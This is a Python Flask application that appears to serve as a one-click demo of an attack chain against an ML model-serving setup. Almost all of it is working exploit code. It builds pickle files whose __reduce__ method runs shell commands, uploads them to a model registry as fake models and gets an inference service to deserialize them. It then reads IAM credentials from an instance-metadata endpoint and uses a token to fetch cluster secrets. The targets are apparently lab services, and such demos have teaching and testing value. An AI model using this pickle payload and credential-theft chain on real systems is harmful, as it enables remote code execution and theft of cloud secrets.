"""Model-as-code: malicious pickle -> inference pod RCE -> node IMDS -> cluster."""
import base64
import os
import pickle
import subprocess

import requests
from flask import Flask, request

app = Flask(__name__)
REGISTRY = os.environ.get("REGISTRY_URL", "http://model-registry:5000")
INFER = os.environ.get("INFER_URL", "http://inference:5000")
CLUSTER = os.environ.get("CLUSTER_URL", "http://cluster-api:5000")

HTML = """<h1>Model-as-Code Attack</h1>
<form method="post" action="/run"><button>Run chain</button></form>
<pre>{{out}}</pre>"""


def build_pickle(cmd):
    class Payload:
        def __reduce__(self):
            return (subprocess.check_output, (["/bin/sh", "-c", cmd],))

    return pickle.dumps(Payload())


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    probe = (
        "python3 -c \"import urllib.request;"
        "print(urllib.request.urlopen('http://node-imds:5000/latest/meta-data/"
        "iam/security-credentials/').read().decode())\""
    )
    payload = build_pickle(probe)
    up = requests.post(f"{REGISTRY}/models",
                       json={"name": "gpt2-malicious", "content": base64.b64encode(payload).decode()},
                       timeout=8)
    mid = up.json()["model_id"]
    log.append(f"[1] uploaded {mid}: {up.json()['scan']} (warning only)")
    inf = requests.post(f"{INFER}/infer", json={"model_id": mid}, timeout=15)
    role = inf.json().get("result", "")
    log.append(f"[2] inference pod executed pickle; node role: {role}")

    fetch_creds = (
        "python3 -c \"import urllib.request;"
        "print(urllib.request.urlopen('http://node-imds:5000/latest/meta-data/"
        "iam/security-credentials/eks-node-role').read().decode())\""
    )
    payload2 = build_pickle(fetch_creds)
    up2 = requests.post(f"{REGISTRY}/models",
                        json={"name": "gpt2-creds", "content": base64.b64encode(payload2).decode()},
                        timeout=8)
    mid2 = up2.json()["model_id"]
    inf2 = requests.post(f"{INFER}/infer", json={"model_id": mid2}, timeout=15)
    creds = inf2.json().get("result", "")
    log.append(f"[3] node credentials: {creds[:200]}...")

    # use the stolen node session token against the cluster API
    sec = requests.get(f"{CLUSTER}/secrets", headers={"Authorization": "Bearer node-session-token"}, timeout=8)
    log.append(f"[4] cluster secrets as node role: {sec.json()}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
